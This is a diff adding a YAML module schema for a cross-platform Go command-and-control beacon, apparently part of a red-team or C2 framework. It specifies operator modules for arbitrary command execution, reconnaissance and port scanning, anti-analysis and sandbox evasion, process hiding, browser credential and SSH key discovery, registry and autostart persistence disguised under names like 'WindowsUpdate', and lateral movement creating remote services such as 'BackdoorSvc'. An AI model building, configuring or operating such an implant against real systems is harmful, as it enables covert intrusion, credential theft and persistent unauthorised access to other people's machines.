@@ -1,0 +1,517 @@
+schema_version: '1.1'
+beacon_info:
+  beacon_type: go_beacon
+  version: 1.0.0
+  description: Cross-platform Go beacon with advanced reconnaissance and evasion capabilities
+  supported_platforms:
+  - windows
+  - linux
+  - macos
+  encoding_strategy: plaintext
+  file_transfer_supported: true
+  keylogger_supported: false
+  supported_protocols:
+  - tcp
+categories:
+  basic_commands:
+    display_name: Basic Commands
+    description: Fundamental command execution capabilities
+    modules:
+      command_execution:
+        display_name: Command Execution
+        description: Execute arbitrary system commands
+        command_template: '{command}'
+        parameters:
+          command:
+            type: textarea
+            display_name: Command
+            description: Enter command to execute on the target system
+            required: true
+            default: ''
+            validation:
+              min_length: 1
+              max_length: 8192
+        documentation:
+          content: Execute system commands directly on the target machine. Commands are executed using the appropriate shell for the platform (cmd on Windows, sh on Unix-like systems) with proper output capture.
+          examples:
+          - whoami
+          - ls -la (Linux/macOS)
+          - dir (Windows)
+          - systeminfo (Windows)  
+          - uname -a (Linux/macOS)
+          - ps aux (Linux/macOS)
+        execution:
+          timeout: 300
+          requires_admin: false
+        ui:
+          layout: simple
+  discovery:
+    display_name: Discovery & Reconnaissance
+    description: System and network reconnaissance capabilities
+    modules:
+      system_info:
+        display_name: System Information
+        description: Gather comprehensive system information
+        command_template: 'execute_module|SystemInfo'
+        parameters: {}
+        documentation:
+          content: Collect detailed system information including hostname, OS, architecture, CPU count, current user details, working directory, executable path, and process information.
+          examples:
+          - Basic system enumeration
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      process_enum:
+        display_name: Process Enumeration
+        description: Enumerate running processes on the system
+        command_template: 'execute_module|ProcessEnum'
+        parameters: {}
+        documentation:
+          content: Lists all running processes on the system. Uses 'tasklist' on Windows and 'ps aux' on Unix-like systems to provide comprehensive process information.
+          examples:
+          - Process discovery for privilege escalation
+          - Identifying security tools
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
+      network_enum:
+        display_name: Network Enumeration
+        description: Enumerate network interfaces and connections
+        command_template: 'execute_module|NetworkEnum'
+        parameters: {}
+        documentation:
+          content: Discovers network interfaces, IP addresses, MAC addresses, and listening ports. Provides both interface details and netstat output for comprehensive network reconnaissance.
+          examples:
+          - Network interface discovery
+          - Listening service identification
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      service_enum:
+        display_name: Service Enumeration
+        description: Enumerate system services
+        command_template: 'execute_module|ServiceEnum'
+        parameters: {}
+        documentation:
+          content: Lists all system services and their status. Uses 'sc query' on Windows and 'systemctl' or 'service' on Unix-like systems.
+          examples:
+          - Service discovery
+          - Identifying vulnerable services
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      user_enum:
+        display_name: User Enumeration
+        description: Enumerate system users and groups
+        command_template: 'execute_module|UserEnum'
+        parameters: {}
+        documentation:
+          content: Enumerates all users on the system, current user details, and privileged groups. Identifies administrators, sudo users, and other privileged accounts.
+          examples:
+          - User account discovery
+          - Privilege escalation target identification
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
+      environment_enum:
+        display_name: Environment Enumeration
+        description: Enumerate environment variables and paths
+        command_template: 'execute_module|EnvironmentEnum'
+        parameters: {}
+        documentation:
+          content: Lists all environment variables and PATH directories, indicating which paths exist on the system. Useful for understanding the execution environment.
+          examples:
+          - Environment variable discovery
+          - PATH enumeration for DLL hijacking
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
+  scanning:
+    display_name: Network Scanning
+    description: Network reconnaissance and scanning capabilities
+    modules:
+      port_scan:
+        display_name: Port Scanner
+        description: Scan target hosts for open ports
+        command_template: 'execute_module|PortScan|{target},{ports}'
+        parameters:
+          target:
+            type: text
+            display_name: Target IP/Hostname
+            description: Target IP address or hostname to scan
+            required: true
+            default: '127.0.0.1'
+            validation:
+              min_length: 7
+              max_length: 253
+          ports:
+            type: text
+            display_name: Ports (comma-separated)
+            description: Comma-separated list of ports to scan (e.g., 80,443,3389)
+            required: true
+            default: '22,23,25,53,80,110,135,139,143,443,993,995,1723,3306,3389,5432,5900,8080'
+            validation:
+              min_length: 2
+              max_length: 1000
+        documentation:
+          content: Performs TCP port scanning against specified targets and ports. Uses 3-second connection timeouts and provides detailed results showing open, closed, and filtered ports.
+          examples:
+          - '127.0.0.1,80,443,3389'
+          - '192.168.1.1,22,23,80,135,139,445'
+        execution:
+          timeout: 300
+          requires_admin: false
+        ui:
+          layout: simple
+      dns_enum:
+        display_name: DNS Enumeration
+        description: Enumerate DNS records for a domain
+        command_template: 'execute_module|DNSEnum|{domain}'
+        parameters:
+          domain:
+            type: text
+            display_name: Domain Name
+            description: Domain name to enumerate DNS records for
+            required: true
+            default: 'example.com'
+            validation:
+              min_length: 3
+              max_length: 253
+        documentation:
+          content: Performs comprehensive DNS enumeration including A, AAAA, MX, NS, TXT, and CNAME records. Also performs reverse DNS lookups for discovered IP addresses.
+          examples:
+          - 'google.com'
+          - 'microsoft.com'
+        execution:
+          timeout: 120
+          requires_admin: false
+        ui:
+          layout: simple
+  file_operations:
+    display_name: File Operations
+    description: File system operations and file transfer capabilities
+    modules:
+      file_search:
+        display_name: File Search
+        description: Search for files matching a pattern
+        command_template: 'execute_module|FileSearch|{directory},{pattern}'
+        parameters:
+          directory:
+            type: directory
+            display_name: Search Directory
+            description: Directory to search in (recursively)
+            required: true
+            default: '/tmp'
+            validation:
+              min_length: 1
+              max_length: 500
+          pattern:
+            type: text
+            display_name: Search Pattern
+            description: File name pattern to search for (case-insensitive substring match)
+            required: true
+            default: '.txt'
+            validation:
+              min_length: 1
+              max_length: 100
+        documentation:
+          content: Recursively searches for files matching the specified pattern. Returns file paths, sizes, and modification times. Limited to 100 results to prevent excessive output.
+          examples:
+          - '/home,password'
+          - 'C:\Users,*.doc'
+          - '/var/log,error'
+        execution:
+          timeout: 180
+          requires_admin: false
+        ui:
+          layout: simple
+  evasion:
+    display_name: Evasion & Anti-Analysis
+    description: Techniques to evade detection and analysis
+    modules:
+      anti_analysis:
+        display_name: Anti-Analysis Checks
+        description: Detect analysis environments and tools
+        command_template: 'execute_module|AntiAnalysis'
+        parameters: {}
+        documentation:
+          content: Performs comprehensive checks to detect debugging, virtualization, sandbox environments, analysis tools, and low-resource environments commonly used for malware analysis.
+          examples:
+          - Debugger detection (OllyDbg, x64dbg, WinDbg, IDA Pro, GDB, strace)
+          - VM detection (VMware, VirtualBox, QEMU, Xen, Hyper-V)
+          - Sandbox detection (Cuckoo, analysis environments)
+          - Analysis tool detection (Wireshark, Process Monitor, API Monitor)
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      timing_evasion:
+        display_name: Timing Evasion
+        description: Apply timing delays to evade analysis
+        command_template: 'execute_module|TimingEvasion|{sleep_seconds}'
+        parameters:
+          sleep_seconds:
+            type: integer
+            display_name: Sleep Duration (seconds)
+            description: Number of seconds to sleep (1-300). Leave empty for random jitter (10-40s)
+            required: false
+            default: 30
+            validation:
+              min_value: 1
+              max_value: 300
+        documentation:
+          content: Applies timing delays to evade analysis systems that have limited execution time. Can use fixed delays or random jitter to make behavior less predictable.
+          examples:
+          - "30 (sleep for 30 seconds)"
+          - "empty for random jitter between 10-40 seconds"
+        execution:
+          timeout: 400
+          requires_admin: false
+        ui:
+          layout: simple
+      process_hide:
+        display_name: Process Hiding
+        description: Attempt to hide beacon process (placeholder)
+        command_template: 'execute_module|ProcessHide|{method}'
+        parameters:
+          method:
+            type: choice
+            display_name: Hiding Method
+            description: Method to use for process hiding
+            required: false
+            default: 'basic'
+            choices:
+            - basic
+            - advanced
+        documentation:
+          content: Process hiding functionality placeholder. Advanced process hiding techniques require platform-specific implementations and elevated privileges.
+          examples:
+          - Basic stealth techniques
+        execution:
+          timeout: 30
+          requires_admin: true
+        ui:
+          layout: simple
+  credential_harvesting:
+    display_name: Credential Harvesting
+    description: Discover and analyze stored credentials and keys
+    modules:
+      browser_credentials:
+        display_name: Browser Credentials Discovery
+        description: Discover browser password and cookie databases
+        command_template: 'execute_module|BrowserCredentials'
+        parameters: {}
+        documentation:
+          content: Searches for browser credential databases across multiple browsers (Chrome, Firefox, Edge, Safari, Opera, Brave). Identifies password databases, cookie stores, and provides metadata without extracting encrypted data.
+          examples:
+          - Cross-platform browser enumeration
+          - Credential store identification
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      ssh_key_discovery:
+        display_name: SSH Key Discovery
+        description: Discover SSH private keys, public keys, and configuration
+        command_template: 'execute_module|SSHKeyDiscovery'
+        parameters: {}
+        documentation:
+          content: Searches for SSH keys in standard locations (~/.ssh/), identifies key types, encryption status, and analyzes SSH configuration files for configured hosts.
+          examples:
+          - SSH key enumeration
+          - SSH configuration analysis
+        execution:
+          timeout: 30
+          requires_admin: false
+        ui:
+          layout: simple
+  persistence:
+    display_name: Persistence Mechanisms
+    description: Establish persistence across system reboots
+    modules:
+      registry_persistence:
+        display_name: Registry Persistence (Windows)
+        description: Create registry-based persistence mechanisms
+        command_template: 'execute_module|RegistryPersistence|{method},{key_name},{command}'
+        parameters:
+          method:
+            type: choice
+            display_name: Registry Method
+            description: Registry persistence technique
+            required: true
+            default: 'run'
+            choices:
+            - run
+            - runonce
+            - runall
+            - service
+            - winlogon
+            - userinit
+            - explorer
+          key_name:
+            type: text
+            display_name: Registry Key Name
+            description: Name for the registry entry
+            required: true
+            default: 'WindowsUpdate'
+            validation:
+              min_length: 1
+              max_length: 100
+          command:
+            type: text
+            display_name: Command to Execute
+            description: Command or executable path to run at startup
+            required: true
+            default: 'C:\Windows\System32\calc.exe'
+            validation:
+              min_length: 1
+              max_length: 500
+        documentation:
+          content: Creates Windows registry entries for persistence. Supports user-level (HKCU) and system-level (HKLM) persistence mechanisms including Run keys, services, and shell replacements.
+          examples:
+          - 'run,MyApp,C:\temp\beacon.exe'
+          - 'service,BackupService,C:\tools\service.exe'
+        execution:
+          timeout: 60
+          requires_admin: false
+        ui:
+          layout: simple
+      autostart_persistence:
+        display_name: Autostart Persistence
+        description: Cross-platform autostart persistence mechanisms
+        command_template: 'execute_module|AutostartPersistence|{method},{command}'
+        parameters:
+          method:
+            type: choice
+            display_name: Autostart Method
+            description: Platform-specific autostart technique
+            required: true
+            default: 'startup'
+            choices:
+            - startup
+            - task
+            - service
+            - launchagent
+            - launchdaemon
+            - systemd
+            - init
+            - cron
+            - bashrc
+          command:
+            type: text
+            display_name: Command to Execute
+            description: Command or script to execute at startup
+            required: true
+            default: '/usr/bin/beacon'
+            validation:
+              min_length: 1
+              max_length: 500
+        documentation:
+          content: Cross-platform persistence mechanisms. Windows (startup folder, scheduled tasks, services), macOS (Launch Agents/Daemons, cron), Linux (systemd, init scripts, cron, shell profiles).
+          examples:
+          - 'startup,C:\tools\beacon.exe'
+          - 'cron,/tmp/beacon.sh'
+          - 'systemd,/usr/local/bin/service'
+        execution:
+          timeout: 120
+          requires_admin: false
+        ui:
+          layout: simple
+  lateral_movement:
+    display_name: Lateral Movement
+    description: Network reconnaissance and remote system access
+    modules:
+      smb_enumeration:
+        display_name: SMB Share Enumeration
+        description: Enumerate SMB shares and NetBIOS information
+        command_template: 'execute_module|SMBEnumeration|{target}'
+        parameters:
+          target:
+            type: text
+            display_name: Target Host
+            description: IP address or hostname to enumerate
+            required: true
+            default: '192.168.1.1'
+            validation:
+              min_length: 7
+              max_length: 253
+        documentation:
+          content: Enumerates SMB shares and NetBIOS information on target systems. Uses native Windows tools (net view, nbtstat) or Linux tools (smbclient, nmblookup) to discover accessible shares.
+          examples:
+          - '192.168.1.100'
+          - 'FILESERVER'
+          - 'DC01.domain.com'
+        execution:
+          timeout: 180
+          requires_admin: false
+        ui:
+          layout: simple
+      remote_service_management:
+        display_name: Remote Service Management
+        description: Manage services on remote Windows systems
+        command_template: 'execute_module|RemoteServiceManagement|{target},{action},{service_name},{binary_path}'
+        parameters:
+          target:
+            type: text
+            display_name: Target Host
+            description: IP address or hostname of target system
+            required: true
+            default: '192.168.1.1'
+            validation:
+              min_length: 7
+              max_length: 253
+          action:
+            type: choice
+            display_name: Service Action
+            description: Action to perform on remote service
+            required: true
+            default: 'list'
+            choices:
+            - list
+            - create
+            - start
+            - stop
+            - delete
+          service_name:
+            type: text
+            display_name: Service Name
+            description: Name of service (required for create/start/stop/delete)
+            required: false
+            default: 'TestService'
+            validation:
+              min_length: 1
+              max_length: 100
+          binary_path:
+            type: text
+            display_name: Binary Path
+            description: Path to service executable (required for create)
+            required: false
+            default: 'C:\temp\service.exe'
+            validation:
+              min_length: 1
+              max_length: 500
+        documentation:
+          content: Manages Windows services on remote systems using sc.exe. Can list services, create new services, start/stop services, and delete services. Requires appropriate privileges on target system.
+          examples:
+          - '192.168.1.100,list'
+          - '192.168.1.100,create,BackdoorSvc,C:\temp\backdoor.exe'
+          - '192.168.1.100,start,BackdoorSvc'
+        execution:
+          timeout: 300
+          requires_admin: true
+        ui:
+          layout: simple
